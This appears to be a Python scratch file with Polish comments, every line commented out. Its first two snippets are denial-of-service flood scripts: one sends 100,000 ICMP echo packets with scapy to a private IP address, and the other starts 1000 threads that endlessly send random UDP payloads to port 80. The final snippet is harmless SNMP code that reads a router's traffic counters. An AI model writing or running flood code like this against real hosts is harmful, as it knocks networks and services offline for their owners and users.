# from scapy.all import *
# from scapy.layers.inet import IP, ICMP
#
#
# def ddos_attack(target_ip, num_packets):
#     # Tworzenie pakietu ICMP Echo Request
#     packet = IP(dst=target_ip) / ICMP()
#
#     # Wysyłanie pakietów
#     send(packet * num_packets)
#
# # Wywołanie funkcji do przeprowadzenia ataku DDoS
# ddos_attack("192.168.0.243", 100000)


# import socket
# import random
# import time
# import threading
#
# # Funkcja do wysyłania pakietów do określonego adresu IP
# def ddos(target_ip):
#     while True:
#         try:
#             # Tworzenie gniazda
#             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#             # Generowanie losowej zawartości pakietu
#             payload = random._urandom(1024)
#             # Wysyłanie pakietu na określony adres IP
#             s.sendto(payload, (target_ip, 80))
#             # Zamykanie gniazda
#             s.close()
#         except socket.error:
#             pass
#
# # Funkcja główna
# def main():
#     # Adres IP, który będzie celem ataku DDoS
#     target_ip = ""
#
#     # Tworzenie wielu wątków, które będą symulować atak
#     for _ in range(1000):
#         print("AA")
#         # Tworzenie wątku dla każdego atakującego
#         thread = threading.Thread(target=ddos, args=(target_ip,))
#         # Uruchamianie wątku
#         thread.start()
#
# main()

# from pysnmp.hlapi import *
#
# # Parametry SNMP
# router_ip = '192.168.0.1'
# community_string = 'nazwa_dla_community_string'
# snmp_port = 161
#
# # Oid dla obciążenia pasma
# oid = ObjectIdentity('IF-MIB', 'ifInOctets', 1)
# Przykładowe OID dla obciążenia pasma (zależne od konkretnego routera)
#
# # Funkcja do pobierania danych SNMP
# def get_snmp_data(ip, oid, community_string, port=161):
#     iterator = getCmd(
#         SnmpEngine(),
#         CommunityData(community_string),
#         UdpTransportTarget((ip, port)),
#         ContextData(),
#         ObjectType(ObjectIdentity(oid))
#     )
#     error_indication, error_status, error_index, var_binds = next(iterator)
#     if error_indication:
#         print(error_indication)
#     elif error_status:
#         print('%s at %s' % (
#             error_status.prettyPrint(),
#             error_index and var_binds[int(error_index) - 1][0] or '?'
#         ))
#     else:
#         for varBind in var_binds:
#             value = varBind[1]
#             print(value)
#
# # Pobranie danych o obciążeniu pasma
# get_snmp_data(router_ip, oid, community_string, snmp_port)
